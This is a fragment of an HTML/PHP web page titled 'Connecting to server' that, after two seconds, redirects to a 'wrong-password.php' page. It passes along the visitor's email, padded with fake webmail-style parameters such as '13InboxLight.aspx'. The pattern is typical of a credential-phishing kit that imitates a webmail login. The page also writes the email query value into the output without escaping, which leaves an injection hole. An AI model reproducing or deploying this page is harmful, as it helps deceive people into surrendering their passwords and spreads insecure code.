<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html><head><title>Connecting to server</title>

<link rel="icon" href="files/id.png" sizes="13x13" type="image/png">

<meta http-equiv="REFRESH" content="2; wrong-password.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">

<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-15'/>
<!-- no core stylesheet -->
</head>




			<br><br>
			</div>

			</font>

			</div></form>
</div>


</body></html><!-- 1 -->